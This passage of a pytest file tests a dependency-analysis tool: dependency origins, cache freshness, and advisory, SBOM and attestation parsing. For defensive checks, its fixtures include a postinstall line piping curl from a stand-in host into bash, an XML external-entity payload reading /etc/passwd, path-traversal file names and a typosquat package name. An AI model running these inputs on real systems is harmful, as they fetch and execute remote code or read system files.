    tmp_path, capsys
):
    (tmp_path / "package.json").write_text(
        '{"dependencies":{"one":"1.0.0","other":"1.0.0"}}'
    )
    (tmp_path / "package-lock.json").write_text(
        json.dumps(
            {
                "lockfileVersion": 3,
                "packages": {
                    "": {"dependencies": {"one": "1.0.0", "other": "1.0.0"}},
                    "node_modules/one": {
                        "version": "1.0.0",
                        "dependencies": {"shared": "1.0.0"},
                    },
                    "node_modules/other": {
                        "version": "1.0.0",
                        "dependencies": {"shared": "2.0.0"},
                    },
                    "node_modules/one/node_modules/shared": {
                        "version": "1.0.0",
                        "dependencies": {"one": "1.0.0"},
                    },
                    "node_modules/shared": {"version": "2.0.0"},
                },
            }
        )
    )
    service = DependencyAgentService(tmp_path)
    service.index_repository()
    before = (tmp_path / ".depcheck/index.sqlite3").read_bytes()
    result = service.explain_dependency(
        "shared", ecosystem="npm", project_id="npm:npm:."
    )
    origins = result["origins"]
    assert {
        (
            tuple(n["package"] for n in p["nodes"]),
            p["nodes"][-1]["version"],
            p["nodes"][-1]["instance"],
        )
        for p in origins["paths"]
    } == {
        (("one", "shared"), "1.0.0", "node_modules/one/node_modules/shared"),
        (("other", "shared"), "2.0.0", "node_modules/shared"),
    }
    assert all(p["declarations"][0]["path"] == "package.json" for p in origins["paths"])
    assert not origins["truncated"] and origins["complete"]
    assert (
        main(
            [
                "explain",
                str(tmp_path),
                "shared",
                "--ecosystem",
                "npm",
                "--origin-limit",
                "1",
            ]
        )
        == 0
    )
    limited = json.loads(capsys.readouterr().out)["origins"]
    assert (
        len(limited["paths"]) == 1 and limited["truncated"] and not limited["complete"]
    )
    assert service.dependency_impact("shared", ecosystem="npm")["origins"] == origins
    assert (tmp_path / ".depcheck/index.sqlite3").read_bytes() == before


def test_dependency_origins_include_direct_targets_and_other_direct_ancestors(tmp_path):
    (tmp_path / "package.json").write_text(
        '{"dependencies":{"parent":"1.0.0","child":"2.0.0"}}'
    )
    (tmp_path / "package-lock.json").write_text(
        json.dumps(
            {
                "lockfileVersion": 3,
                "packages": {
                    "": {"dependencies": {"parent": "1.0.0", "child": "2.0.0"}},
                    "node_modules/parent": {
                        "version": "1.0.0",
                        "dependencies": {"child": "2.0.0"},
                    },
                    "node_modules/child": {"version": "2.0.0"},
                },
            }
        )
    )
    service = DependencyAgentService(tmp_path)
    service.index_repository()
    origins = service.explain_dependency("child")["origins"]
    assert origins["complete"]
    assert {tuple(n["package"] for n in p["nodes"]) for p in origins["paths"]} == {
        ("child",),
        ("parent", "child"),
    }


def test_dependency_origins_preserve_missing_graph_and_depth_limits(tmp_path):
    (tmp_path / "requirements.txt").write_text("requests>=2\n")
    service = DependencyAgentService(tmp_path)
    service.index_repository()
    origins = service.explain_dependency("requests", ecosystem="PyPI")["origins"]
    assert not origins["complete"] and not origins["paths"]
    assert origins["diagnostics"]
    with pytest.raises(ValueError):
        service.explain_dependency("requests", origin_depth=0)


@pytest.mark.parametrize("kind", ["oversized", "duplicate", "symlink"])
def test_external_json_rejects_unsafe_or_ambiguous_input(tmp_path, kind):
    path = tmp_path / "bom.json"
    if kind == "oversized":
        path.write_bytes(b" " * (8 * 1024 * 1024 + 1))
    elif kind == "duplicate":
        path.write_text('{"bomFormat":"CycloneDX","bomFormat":"other"}')
    else:
        target = tmp_path / "real.json"
        target.write_text('{"bomFormat":"CycloneDX","specVersion":"1.7"}')
        path.symlink_to(target)
    with pytest.raises((OSError, ValueError)):
        DependencyAgentService(tmp_path).inspect_dependency_sbom("bom.json")


def test_evidence_pages_bound_payload_and_keep_full_impact_counts(tmp_path):
    (tmp_path / "package.json").write_text('{"dependencies":{"lib":"1.0.0"}}')
    (tmp_path / "app.js").write_text('import "lib";\n' * 1200)
    service = DependencyAgentService(tmp_path)
    service.index_repository()
    first = service.query_dependencies(limit=1)
    assert len(json.dumps(first).encode()) < 256 * 1024
    assert first["truncated"] and first["evidence_truncated"]
    entry = first["dependencies"][0]
    assert entry["evidence_page"]["counts"]["usages"] == 1200
    seen = []
    offset = 0
    while offset is not None:
        page = service.explain_dependency(
            "lib", evidence_limit=100, evidence_offset=offset
        )
        seen.extend(u["location"]["line"] for u in page["usages"])
        offset = page["evidence_page"]["next_offset"]
    assert seen == list(range(1, 1201))
    impact = service.dependency_impact("lib", evidence_limit=10)
    assert impact["usage_count"] == 1200
    assert impact["evidence_page"]["counts"]["usages"] == 1200
    assert len(impact["usages"]) == 10
    with pytest.raises(ValueError):
        service.query_dependencies(evidence_offset=-1)


def test_scan_and_explain_reuse_work_without_accepting_changed_evidence(
    tmp_path, monkeypatch
):
    from depcheck.indexing import RepositoryIndex

    (tmp_path / "package.json").write_text('{"dependencies":{"lib":"1.0.0"}}')
    source = tmp_path / "app.js"
    source.write_text('import "lib";')
    original = RepositoryScanner.scan
    scans = []

    def measured(self, *args, **kwargs):
        scans.append(1)
        return original(self, *args, **kwargs)

    monkeypatch.setattr(RepositoryScanner, "scan", measured)
    service = DependencyAgentService(tmp_path)
    service.scan_repository()
    assert len(scans) == 1
    context_original = RepositoryIndex._context
    contexts = []

    def context(self, *args, **kwargs):
        contexts.append(1)
        return context_original(self, *args, **kwargs)

    monkeypatch.setattr(RepositoryIndex, "_context", context)
    service.explain_dependency("lib")
    assert len(contexts) == 1
    cache = tmp_path / ".depcheck/index.sqlite3"
    before = cache.read_bytes()

    def changed(self, *args, **kwargs):
        result = original(self, *args, **kwargs)
        source.write_text('import "new";')
        return result

    monkeypatch.setattr(RepositoryScanner, "scan", changed)
    with pytest.raises(RuntimeError, match="changed during scanning"):
        service.scan_repository()
    assert cache.read_bytes() == before

    # Changing source after the first receipt check must not pair an old
    # analysis with the new source digest and publish it as a fresh cache.
    from depcheck.indexing import indexer

    source.write_text('import "lib";')
    monkeypatch.setattr(RepositoryScanner, "scan", measured)
    original_digests = indexer._bundle_file_digests

    def changed_during_fingerprinting(*args, **kwargs):
        source.write_text('import "new";')
        return original_digests(*args, **kwargs)

    monkeypatch.setattr(indexer, "_bundle_file_digests", changed_during_fingerprinting)
    with pytest.raises(RuntimeError, match="changed during scanning"):
        service.scan_repository()
    assert cache.read_bytes() == before


def test_tool_response_budget_handles_oversized_single_evidence(tmp_path):
    from depcheck.agent.paging import evidence_page, bounded_response

    payload = {
        "schema": "depcheck.agent.dependency-explanation.v1",
        "package": "lib",
        "usages": [{"reference": "字" * 100000}],
        "imports": [],
    }
    bounded = evidence_page(payload, limit=20, offset=0)
    assert bounded["error"]["code"] == "response.budget-exceeded"
    assert len(json.dumps(bounded).encode()) < 256 * 1024
    assert bounded_response({"inventory": ["x" * 300000]})["tool_result_omitted"]
    assert len(payload["usages"]) == 1


def test_schema3_query_is_read_only_and_refresh_rebuilds_source_evidence(tmp_path):
    from depcheck.indexing import RepositoryIndex, RepositoryIndexer
    from depcheck.indexing.store import IndexStore
    import sqlite3

    (tmp_path / "requirements.txt").write_text("requests==2.31.0\n")
    RepositoryIndexer().refresh(tmp_path)
    path = tmp_path / ".depcheck/index.sqlite3"
    with closing(sqlite3.connect(path)) as c, c:
        c.execute("UPDATE metadata SET value='depcheck.index.v3' WHERE key='schema'")
    before = path.read_bytes()
    with pytest.raises(RuntimeError, match="incompatible"):
        RepositoryIndex(tmp_path).dependencies()
    assert path.read_bytes() == before
    RepositoryIndexer().refresh(tmp_path)
    with IndexStore(tmp_path, read_only=True) as store:
        assert store.metadata()["schema"] == "depcheck.index.v4"
    assert (
        RepositoryIndex(tmp_path).dependencies()[0]["declarations"][0]["metadata"][
            "origin"
        ]["public"]
        is True
    )


@pytest.mark.parametrize("filtered", [False, True])
def test_bzlmod_index_keeps_scopes_requests_and_readonly_freshness(tmp_path, filtered):
    root_manifest = tmp_path / "MODULE.bazel"
    root_manifest.write_text(
        'bazel_dep(name="fmt",version="11.0.0",repo_name="format")\n'
    )
    child = tmp_path / "child"
    child.mkdir()
    (child / "MODULE.bazel").write_text(
        'bazel_dep(name="fmt",version="10.0.0",dev_dependency=True)\n'
    )
    lock = tmp_path / "MODULE.bazel.lock"
    lock.write_text('{"lockFileVersion":26,"moduleExtensions":{}}')
    service = DependencyAgentService(tmp_path)
    selection = {"ecosystems": ["Bazel"]} if filtered else {}
    service.index_repository(**selection)
    assert (
        service.explain_dependency("fmt", ecosystem="Bazel")["error"]["code"]
        == "dependency.ambiguous"
    )
    cache = tmp_path / ".depcheck/index.sqlite3"
    before = cache.read_bytes(), cache.stat().st_mtime_ns
    record = service.explain_dependency(
        "fmt", ecosystem="Bazel", project_id="bazel:bzlmod:."
    )
    assert record["declarations"][0]["metadata"]["arguments"]["repo_name"] == "format"
    assert record["declarations"][0]["location"]["path"] == "MODULE.bazel"
    assert record["resolved_versions"] == [] and not record["evidence_complete"]
    assert (
        service.dependency_impact(
            "fmt", ecosystem="Bazel", project_id="bazel:bzlmod:child"
        )["usage_count"]
        == 0
    )
    assert cache.read_bytes() == before[0] and cache.stat().st_mtime_ns == before[1]
    old_stat = root_manifest.stat()
    root_manifest.write_text(root_manifest.read_text().replace("11.0.0", "12.0.0"))
    import os

    os.utime(root_manifest, ns=(old_stat.st_atime_ns, old_stat.st_mtime_ns))
    assert service.repository_context()["stale"]
    with pytest.raises(RuntimeError, match="stale"):
        service.explain_dependency(
            "fmt", ecosystem="Bazel", project_id="bazel:bzlmod:."
        )
    assert cache.read_bytes() == before[0] and cache.stat().st_mtime_ns == before[1]
    service.index_repository(**selection)
    assert not service.repository_context()["stale"]
    lock.write_text('{"lockFileVersion":27,"moduleExtensions":{}}')
    assert service.repository_context()["stale"]
    service.index_repository(**selection)
    root_manifest.unlink()
    assert service.repository_context()["stale"]
    service.index_repository(**selection)
    assert service.query_dependencies(ecosystem="Bazel")["count"] == 1


@pytest.mark.parametrize("mode", ["project", "script"])
@pytest.mark.parametrize("helper_name", ["deps.cmake", "deps.cmake.in"])
def test_cmake_index_retains_origins_and_detects_helper_changes(
    tmp_path, mode, helper_name
):
    from depcheck.indexing import RepositoryIndex

    if mode == "project":
        (tmp_path / "CMakeLists.txt").write_text("include(FetchContent)\n")
    project_id = "cmake:cmake:." if mode == "project" else "cmake:cmake-script:."
    helper = tmp_path / helper_name
    helper.write_text(
        "FetchContent_Declare(Catch2 GIT_REPOSITORY https://github.com/catchorg/Catch2.git GIT_TAG v3.8.1)\n"
    )
    service = DependencyAgentService(tmp_path)
    service.index_repository()
    assert not service.repository_context()["complete"]
    assert not service.repository_context()["stale"]
    cache = tmp_path / ".depcheck/index.sqlite3"
    before = cache.read_bytes()
    record = service.explain_dependency(
        "CATCH2", ecosystem="CMake", project_id=project_id
    )
    assert record["resolved_versions"] == []
    assert record["purl"] is None
    assert record["declarations"][0]["location"]["path"] == helper_name
    assert record["declarations"][0]["metadata"]["options"]["GIT_TAG"] == ["v3.8.1"]
    assert (
        RepositoryIndex(tmp_path).dependencies(package="CATCH2", project_id=project_id)[
            0
        ]["package"]
        == "catch2"
    )
    assert cache.read_bytes() == before
    helper.write_text(helper.read_text().replace("v3.8.1", "main"))
    assert service.repository_context()["stale"]
    with pytest.raises(RuntimeError, match="stale"):
        service.query_dependencies(ecosystem="CMake")
    service.index_repository()
    assert service.query_dependencies(ecosystem="CMake")["dependencies"][0][
        "declarations"
    ][0]["metadata"]["options"]["GIT_TAG"] == ["main"]
    (tmp_path / ("extra." + helper_name)).write_text(
        "find_package(Other CONFIG REQUIRED)\n"
    )
    assert service.repository_context()["stale"]
    service.index_repository()
    assert service.query_dependencies(ecosystem="CMake")["count"] == 2
    if mode == "script":
        (tmp_path / "CMakeLists.txt").write_text("include(deps.cmake)\n")
        assert service.repository_context()["stale"]
        service.index_repository()
        assert (
            service.query_dependencies(ecosystem="CMake", project_id=project_id)[
                "count"
            ]
            == 0
        )
        assert (
            service.query_dependencies(ecosystem="CMake", project_id="cmake:cmake:.")[
                "count"
            ]
            == 2
        )


def test_external_security_reports_keep_source_assertions_and_read_only_cache(tmp_path):
    import base64
    import hashlib

    make_python_project(tmp_path)
    service = DependencyAgentService(tmp_path)
    service.index_repository()
    cache = tmp_path / ".depcheck/index.sqlite3"
    original = cache.read_bytes(), cache.stat().st_mtime_ns
    evidence = tmp_path / ".tmp"
    evidence.mkdir()
    cve = {
        "dataType": "CVE_RECORD",
        "dataVersion": "5.1.1",
        "cveMetadata": {
            "cveId": "CVE-2026-12345",
            "state": "REJECTED",
            "dateUpdated": "2026-10-18T00:00:00Z",
        },
        "containers": {
            "cna": {
                "providerMetadata": {"orgId": "original"},
                "rejectedReasons": [{"lang": "en", "value": "duplicate"}],
            },
            "adp": [
                {
                    "providerMetadata": {"orgId": "other"},
                    "problemTypes": [
                        {
                            "descriptions": [
                                {
                                    "cweId": "CWE-79",
                                    "description": "reported weakness",
                                    "lang": "en",
                                }
                            ]
                        }
                    ],
                }
            ],
        },
    }
    (evidence / "cve.json").write_text(json.dumps(cve))
    projected = service.inspect_evidence(".tmp/cve.json", "cve", limit=1)
    assert projected["total"] == 2 and projected["next_offset"] == 1
    assert projected["metadata"]["state"] == "REJECTED"
    adp = service.inspect_evidence(".tmp/cve.json", "cve", limit=1, offset=1)
    assert adp["records"][0]["weaknesses"][0]["cweId"] == "CWE-79"
    assert adp["records"][0]["provider"]["orgId"] == "other"
    assert adp["finding_effect"] == "none"
    statement = {
        "_type": "https://in-toto.io/Statement/v1",
        "subject": [
            {
                "name": "../../MUST_NOT_READ",
                "digest": {"sha256": hashlib.sha256(b"selected").hexdigest()},
            }
        ],
        "predicateType": "https://example.test/predicate/v1",
        "predicate": {"command": "touch MUST_NOT_RUN"},
    }
    (evidence / "artifact").write_bytes(b"selected")
    (evidence / "proof.json").write_text(
        json.dumps(
            {
                "payloadType": "application/vnd.in-toto+json",
                "payload": base64.b64encode(json.dumps(statement).encode()).decode(),
                "signatures": [
                    {
                        "keyid": "../../PRIVATE_KEY",
                        "sig": base64.b64encode(b"unverified").decode(),
                    }
                ],
            }
        )
    )
    proof = service.inspect_evidence(
        ".tmp/proof.json", "attestation", artifact_file=".tmp/artifact"
    )
    assert proof["records"][0]["digest_match"] is True
    assert not proof["records"][0]["identity_verified"]
    assert proof["metadata"]["verification_status"] == "not-performed"
    assert not (tmp_path / "MUST_NOT_RUN").exists()
    assert original == (cache.read_bytes(), cache.stat().st_mtime_ns)


def test_vex_preserves_unknown_and_does_not_suppress_even_not_affected(tmp_path):
    service = DependencyAgentService(tmp_path)
    vex = {
        "@context": "https://openvex.dev/ns/v0.2.0",
        "@id": "urn:example:vex",
        "author": "issuer",
        "timestamp": "2026-10-18T00:00:00Z",
        "version": 1,
        "statements": [
            {
                "vulnerability": {"name": "CVE-2026-12345"},
                "products": [{"@id": "pkg:pypi/demo@1"}],
                "status": "under_investigation",
            },
            {
                "vulnerability": {"name": "CVE-2026-12345"},
                "products": [{"@id": "pkg:pypi/demo@1"}],
                "status": "not_affected",
                "justification": "vulnerable_code_not_in_execute_path",
            },
        ],
    }
    path = tmp_path / "vex.json"
    path.write_text(json.dumps(vex))
    result = service.inspect_evidence("vex.json", "vex")
    assert [row["status"] for row in result["records"]] == [
        "under_investigation",
        "not_affected",
    ]
    assert all(row["suppresses_findings"] is False for row in result["records"])
    del vex["statements"][1]["justification"]
    path.write_text(json.dumps(vex))
    with pytest.raises(ValueError, match="impact statement"):
        service.inspect_evidence("vex.json", "vex")


def test_cwe_catalog_projection_is_versioned_bounded_and_rejects_entities(tmp_path):
    service = DependencyAgentService(tmp_path)
    path = tmp_path / "cwe.xml"
    path.write_text(
        '<Weakness_Catalog xmlns="http://cwe.mitre.org/cwe-7" Name="sample" Version="4.20" Date="2026-10-18"><Weaknesses><Weakness ID="79" Name="XSS" Abstraction="Base" Status="Stable"><Description>Reported classification</Description><Related_Weaknesses><Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000"/></Related_Weaknesses></Weakness></Weaknesses></Weakness_Catalog>'
    )
    result = service.inspect_evidence("cwe.xml", "cwe")
    assert result["metadata"]["version"] == "4.20"
    assert result["records"][0]["relationships"][0]["CWE_ID"] == "74"
    assert result["finding_effect"] == "none"
    path.write_text(
        '<!DOCTYPE x [<!ENTITY secret SYSTEM "file:///etc/passwd">]><x>&secret;</x>'
    )
    with pytest.raises(ValueError, match="DTD/entity"):
        service.inspect_evidence("cwe.xml", "cwe")


def test_govulncheck_import_uses_findings_modes_and_granularity(tmp_path):
    messages = [
        {
            "config": {
                "protocol_version": "v1.0.0",
                "scanner_name": "govulncheck",
                "scanner_version": "v1.1.4",
                "scan_mode": "source",
                "scan_level": "symbol",
                "go_version": "go1.25",
            }
        },
        {"osv": {"id": "GO-2026-0001"}},
        {
            "finding": {
                "osv": "GO-2026-0001",
                "trace": [{"module": "example.com/lib", "version": "v1.0.0"}],
            }
        },
        {
            "finding": {
                "osv": "GO-2026-0001",
                "trace": [
                    {
                        "module": "example.com/lib",
                        "version": "v1.0.0",
                        "package": "example.com/lib/api",
                        "function": "Unsafe",
                    },
                    {
                        "module": "example.com/app",
                        "package": "main",
                        "function": "main",
                    },
                ],
            }
        },
    ]
    path = tmp_path / "govuln.json"
    path.write_text("\n".join(json.dumps(value, indent=2) for value in messages))
    service = DependencyAgentService(tmp_path)
    result = service.inspect_evidence("govuln.json", "govulncheck")
    assert [row["granularity"] for row in result["tables"]["findings"]] == [
        "module",
        "symbol",
    ]
    assert (
        result["tables"]["findings"][1]["trace_order"] == "vulnerable-symbol-to-entry"
    )
    assert result["metadata"]["completion_status"].startswith("unknown")
    messages[0]["config"]["scan_level"] = "package"
    path.write_text("\n".join(json.dumps(value) for value in messages))
    with pytest.raises(ValueError, match="scan level"):
        service.inspect_evidence("govuln.json", "govulncheck")


def test_python_callable_propagation_resolves_callbacks_returns_and_shadowing(tmp_path):
    (tmp_path / "lib.py").write_text(
        "def vulnerable():\n    pass\ndef factory():\n    return vulnerable\ndef invoke(callback):\n    callback()\n"
    )
    (tmp_path / "app.py").write_text(
        "from lib import factory as make, invoke, vulnerable as hidden\ndef main():\n    chosen = make()\n    invoke(chosen)\ndef shadow(hidden):\n    hidden()\n"
    )
    spec = {
        "schema": "depcheck.python-call-analysis.v1",
        "sources": [
            {"path": "app.py", "module": "app"},
            {"path": "lib.py", "module": "lib", "package_purl": "pkg:pypi/demo@1"},
        ],
        "entries": ["app:main"],
        "vulnerability_symbols": [
            {"advisory_id": "CVE-2026-12345", "node_id": "lib:vulnerable"}
        ],
    }
    (tmp_path / "analysis.json").write_text(json.dumps(spec))
    result = DependencyAgentService(tmp_path).analyze_python_calls(
        "analysis.json", limit=100
    )
    assessment = result["tables"]["assessments"][0]
    assert assessment["path"] == ["app:main", "lib:invoke", "lib:vulnerable"]
    assert not assessment["not_affected_established"]
    assert not any(
        edge["source"] == "app:shadow" and edge["target"] == "lib:vulnerable"
        for edge in result["tables"]["edges"]
    )
    assert any(
        call["scope"] == "app:shadow" for call in result["tables"]["unresolved_calls"]
    )
    assert result["metadata"]["coverage"]["state"] == "incomplete"
    assert set(result["metadata"]["source_hashes"]) == {"app.py", "lib.py"}
    spec["sources"][0]["path"] = "../escape.py"
    (tmp_path / "analysis.json").write_text(json.dumps(spec))
    with pytest.raises((ValueError, OSError)):
        DependencyAgentService(tmp_path).analyze_python_calls("analysis.json")


def test_offline_osv_reevaluation_matches_versions_aliases_and_preserves_input(
    tmp_path,
):
    (tmp_path / "requirements.txt").write_text("demo==1.5\n")
    scan = (
        RepositoryScanner()
        .scan(tmp_path, RepositoryScanOptions(security=False, compatibility=False))
        .to_dict()
    )
    (tmp_path / "snapshot.json").write_text(json.dumps(scan))
    database = {
        "schema": "depcheck.osv-database.v1",
        "generated_at": "2026-10-18T00:00:00Z",
        "records": [
            {
                "schema_version": "1.7.0",
                "id": identifier,
                "modified": "2026-10-18T00:00:00Z",
                "aliases": ["CVE-2026-12345"],
                "affected": [
                    {
                        "package": {"name": "demo", "ecosystem": "PyPI"},
                        "ranges": [
                            {
                                "type": "ECOSYSTEM",
                                "events": [{"introduced": "0"}, {"fixed": "2"}],
                            }
                        ],
                    }
                ],
            }
            for identifier in ("OSV-ONE", "OSV-TWO")
        ],
    }
    (tmp_path / "osv.json").write_text(json.dumps(database))
    before = (tmp_path / "snapshot.json").read_bytes()
    service = DependencyAgentService(tmp_path)
    result = service.reevaluate_vulnerabilities("snapshot.json", "osv.json")
    row = result["observations"][0]
    assert row["status"] == "matched" and row["matching_complete"]
    assert len(row["vulnerabilities"]) == 1
    assert row["vulnerabilities"][0]["advisory_ids"] == ["OSV-ONE", "OSV-TWO"]
    assert row["vulnerabilities"][0]["fix_version"] == "2"
    assert result["global_vulnerability_coverage"] == "unknown"
    assert before == (tmp_path / "snapshot.json").read_bytes()
    for record in database["records"]:
        record["withdrawn"] = "2026-10-17T00:00:00Z"
    (tmp_path / "osv.json").write_text(json.dumps(database))
    retired = service.reevaluate_vulnerabilities("snapshot.json", "osv.json")
    assert retired["observations"][0]["status"] == "not-matched-in-supplied-records"


def test_package_supply_signals_provenance_and_registry_opt_in(tmp_path, monkeypatch):
    service = DependencyAgentService(tmp_path)
    (tmp_path / "old.json").write_text(json.dumps({"name": "demo", "scripts": {}}))
    (tmp_path / "new.json").write_text(
        json.dumps(
            {
                "name": "demo",
                "scripts": {"postinstall": "curl https://example.test/data | bash"},
            }
        )
    )
    result = service.compare_package_behavior("old.json", "new.json")
    script = result["changes"][0]["after"]
    assert script["lifecycle"] and set(script["capabilities"]) == {
        "network-transfer",
        "shell-execution",
    }
    assert script["executed"] is False and script["maliciousness"] == "not-established"
    names = service.compare_package_names(
        "requsets", ["requests", "something-else"], "PyPI"
    )
    assert names["signals"][0]["mechanism"] == "adjacent-transposition"
    monkeypatch.setattr(
        "requests.Session.get",
        lambda *args, **kwargs: pytest.fail("network without opt-in"),
    )
    with pytest.raises(ValueError, match="allow_network"):
        service.verify_registry_package("PyPI", "requests")
    scan = (
        RepositoryScanner()
        .scan(tmp_path, RepositoryScanOptions(security=False, compatibility=False))
        .to_dict()
    )
    (tmp_path / "scan.json").write_text(json.dumps(scan))
    exported = service.export_evidence(
        "scan.json", "provenance", input_files=("new.json",)
    )
    assert exported["predicate"]["signature_status"] == "unsigned"
    assert exported["predicate"]["inputs"][0]["name"] == "new.json"
    policy = service.export_evidence("scan.json", "policy")
    assert (
        policy["evaluation_status"] == "not-evaluated"
        and not policy["external_evaluator_invoked"]
    )


@pytest.mark.parametrize(
    "status,identity,expected",
    [
        (200, "requests", "reported-present"),
        (404, None, "not-found-at-queried-source"),
        (503, None, "unknown"),
        (200, "other", "unknown"),
    ],
)
def test_explicit_registry_lookup_pins_destination_and_distinguishes_outcomes(
    tmp_path, monkeypatch, status, identity, expected
):
    from depcheck.supply_chain import verify_registry_package

    calls = []

    class Response:
        status_code = status

        def __enter__(self):
            return self

        def __exit__(self, *args):
            return False

        def iter_content(self, chunk_size):
            yield json.dumps({"info": {"name": identity, "version": "2.0b1"}}).encode()

    class Session:
        trust_env = True

        def get(self, url, **kwargs):
            assert self.trust_env is False
            calls.append((url, kwargs))
            return Response()

        def close(self):
            pass

    monkeypatch.setattr("requests.Session", Session)
    result = verify_registry_package(
        "PyPI", "Requests", version="2.0b1", allow_network=True
    )
    assert (
        result["existence"] == expected and result["source_trust"] == "not-established"
    )
    assert calls[0][0] == "https://pypi.org/pypi/requests/2.0b1/json"
    assert calls[0][1]["allow_redirects"] is False
    assert result["installation_status"] == "not-attempted"


def test_cross_inventory_comparison_preserves_multiplicity_and_quality(tmp_path):
    service = DependencyAgentService(tmp_path)
    before = {
        "bomFormat": "CycloneDX",
        "specVersion": "1.7",
        "components": [
            {
                "bom-ref": "one",
                "name": "demo",
                "purl": "pkg:npm/demo@1.0.0",
                "licenses": [{"expression": "MIT OR Apache-2.0"}],
                "scope": "optional",
                "evidence": {"identity": {"field": "purl", "confidence": 0.5}},
            }
        ],
    }
    after = {
        **before,
        "components": [
            *before["components"],
            {"bom-ref": "two", "name": "demo", "purl": "pkg:npm/demo@1.0.0"},
        ],
    }
    (tmp_path / "before.json").write_text(json.dumps(before))
    (tmp_path / "after.json").write_text(json.dumps(after))
    inventory = service.inspect_dependency_sbom("before.json")
    assert inventory["quality"]["fields"]["evidence_assertion"] == {
        "reported": 1,
        "missing": 0,
    }
    assert (
        inventory["components"][0]["assertion"]["evidence"]["identity"]["confidence"]
        == 0.5
    )
    comparison = service.compare_inventories("before.json", "after.json")
    assert comparison["differences"][0]["before_occurrences"] == 1
    assert comparison["differences"][0]["after_occurrences"] == 2
    assert comparison["false_positive_rate"] is None
    assert comparison["scope_alignment"] == "not-established"


def test_offline_osv_does_not_collapse_qualified_or_private_sbom_identities(tmp_path):
    components = [
        {"bom-ref": "public", "name": "demo", "purl": "pkg:pypi/demo@1"},
        {
            "bom-ref": "private",
            "name": "demo",
            "purl": "pkg:pypi/demo@1?repository_url=https%3A%2F%2Fprivate.example",
        },
        {"bom-ref": "subpath", "name": "demo", "purl": "pkg:pypi/demo@1#vendor"},
        {
            "bom-ref": "source",
            "name": "demo",
            "purl": "pkg:pypi/demo@1",
            "properties": [
                {
                    "name": "depcheck:source:origin",
                    "value": '{"kind":"private","public":false}',
                }
            ],
        },
    ]
    (tmp_path / "bom.json").write_text(
        json.dumps(
            {"bomFormat": "CycloneDX", "specVersion": "1.7", "components": components}
        )
    )
    record = {
        "schema_version": "1.7.0",
        "id": "OSV-ONE",
        "modified": "2026-10-18T00:00:00Z",
        "affected": [
            {"package": {"name": "demo", "ecosystem": "PyPI"}, "versions": ["1"]}
        ],
    }
    (tmp_path / "osv.json").write_text(json.dumps(record))
    result = DependencyAgentService(tmp_path).reevaluate_vulnerabilities(
        "bom.json", "osv.json"
    )
    assert [row["status"] for row in result["observations"]] == [
        "matched",
        "unknown",
        "unknown",
        "unknown",
    ]
    assert (
        result["observations"][0]["identity_basis"] == "external-coordinate-assertion"
    )


def test_offline_osv_canonical_input_cannot_spoof_external_purl_profile(tmp_path):
    (tmp_path / "scan.json").write_text(
        json.dumps(
            {
                "schema": "depcheck.scan.v1",
                "inventory": {
                    "resolved_dependencies": [
                        {
                            "identity": {
                                "ecosystem": "PyPI",
                                "package": "demo",
                                "version": "1",
                                "assertion_kind": "external-sbom-unqualified-purl",
                            }
                        }
                    ]
                },
            }
        )
    )
    (tmp_path / "osv.json").write_text(
        json.dumps(
            {
                "id": "OSV-ONE",
                "schema_version": "1.7.0",
                "modified": "2026-10-18T00:00:00Z",
                "affected": [
                    {
                        "package": {"ecosystem": "PyPI", "name": "demo"},
                        "versions": ["1"],
                    }
                ],
            }
        )
    )
    result = DependencyAgentService(tmp_path).reevaluate_vulnerabilities(
        "scan.json", "osv.json"
    )
    assert result["observations"][0]["status"] == "unknown"
    assert result["observations"][0]["vulnerabilities"] == []


def test_evidence_cli_routes_and_profiles_without_writing_or_network(tmp_path, capsys):
    (tmp_path / "source.py").write_text("def entry():\n    pass\n")
    (tmp_path / "analysis.json").write_text(
        json.dumps(
            {
                "schema": "depcheck.python-call-analysis.v1",
                "sources": [{"path": "source.py", "module": "source"}],
                "entries": ["source:entry"],
            }
        )
    )
    assert main(["--profile", "python-calls", str(tmp_path), "analysis.json"]) == 0
    captured = capsys.readouterr()
    payload = json.loads(captured.out)
    assert payload["schema"] == "depcheck.python-calls.v1"
    phases = json.loads(captured.err)["phases"]
    assert phases["io.read-bytes"]["calls"] >= 2
    assert phases["parsing.python-ast"]["calls"] == 1
    (tmp_path / "one.json").write_text('{"scripts":{}}')
    (tmp_path / "two.json").write_text('{"scripts":{"postinstall":"node setup.js"}}')
    assert main(["package-behavior", str(tmp_path), "one.json", "two.json"]) == 0
    assert json.loads(capsys.readouterr().out)["total"] == 1
    assert main(["package-names", str(tmp_path), "PyPI", "requsets", "requests"]) == 0
    assert json.loads(capsys.readouterr().out)["signals"]
    assert main(["registry", str(tmp_path), "PyPI", "requests"]) == 2
    assert "allow_network" in capsys.readouterr().err
    scan = (
        RepositoryScanner()
        .scan(tmp_path, RepositoryScanOptions(security=False, compatibility=False))
        .to_dict()
    )
    (tmp_path / "scan.json").write_text(json.dumps(scan))
    assert (
        main(
            [
                "export-evidence",
                str(tmp_path),
                "provenance",
                "scan.json",
                "--input-file",
                "source.py",
            ]
        )
        == 0
    )
    assert (
        json.loads(capsys.readouterr().out)["predicate"]["signature_status"]
        == "unsigned"
    )
    assert not (tmp_path / ".depcheck").exists()


def test_offline_osv_accepts_default_schema_and_separates_package_less_git(tmp_path):
    bom = {
        "bomFormat": "CycloneDX",
        "specVersion": "1.7",
        "components": [
            {"bom-ref": "one", "name": "demo", "purl": "pkg:pypi/demo@1.0.0"}
        ],
    }
    (tmp_path / "bom.json").write_text(json.dumps(bom))
    record = {
        "id": "OSV-DEFAULT",
        "modified": "2026-10-18T00:00:00Z",
        "affected": [
            {"package": {"ecosystem": "PyPI", "name": "demo"}, "versions": ["1.0"]},
            {
                "ranges": [
                    {
                        "type": "GIT",
                        "repo": "https://example.test/source.git",
                        "events": [{"introduced": "abc"}, {"fixed": "def"}],
                    }
                ]
            },
        ],
    }
    (tmp_path / "osv.json").write_text(json.dumps(record))
    result = DependencyAgentService(tmp_path).reevaluate_vulnerabilities(
        "bom.json", "osv.json"
    )
    row = result["observations"][0]
    assert row["status"] == "matched" and row["matching_complete"]
    assert row["vulnerabilities"][0]["fix_version"] is None
    assert row["advisory_checks"][0]["status"] == "affected"
    assert "normalized" in row["advisory_checks"][0]["reason"]
    assert result["database"]["unmapped_affected_entries"] == 1
    assert result["global_vulnerability_coverage"] == "unknown"


@pytest.mark.parametrize("schema", ["2.0.0", "v1.9.2", True])
def test_offline_osv_rejects_unknown_schema_versions_before_matching(tmp_path, schema):
    (tmp_path / "bom.json").write_text(
